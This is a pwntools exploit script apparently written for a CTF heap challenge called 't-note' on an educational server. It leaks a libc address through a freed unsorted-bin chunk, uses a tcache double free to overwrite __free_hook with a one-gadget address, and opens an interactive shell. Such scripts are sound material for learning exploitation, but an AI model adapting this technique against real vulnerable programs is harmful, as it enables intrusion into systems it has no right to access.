import binascii
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc_path = os.path.join(os.getcwd(), './libc.so')
libc = ELF(libc_path)

p = remote('edu-ctf.csie.org', 10179)
# p = process('./t-note', env={'LD_PRELOAD': libc_path})
# gdb.attach(p, 'b main\n')

def add(size, body):
    p.sendlineafter('>', '1')
    p.sendlineafter('Size', str(size))
    p.sendafter('Note', body)

def show(idx):
    p.sendlineafter('>', '2')
    p.sendlineafter('Index', str(idx))

def delete(idx):
    p.sendlineafter('>', '3')
    p.sendlineafter('Index', str(idx))


# for throwing to unsorted bin (tcache, should > small bin)
add(0x410, b'leak')
# no need to choose correct size, no need to A-B-A free
add(0x20, 'aaa') # idx=1
delete(0)
# the same information leak
show(0)

p.recvline()
# mysterious offs found via gdb
libc_base = u64(p.recv(6) + b'\0\0') - 0x3ebca0
log.success('libc base: %s', hex(libc_base))

delete(1)
delete(1)

# fake chunk, but no need to fake size
add(0x20, p64(libc_base + libc.symbols[b'__free_hook']))
# get 2nd, 1st
add(0x20, 'x')
# one gadget
add(0x20, p64(libc_base + 0x4f322))

p.interactive()
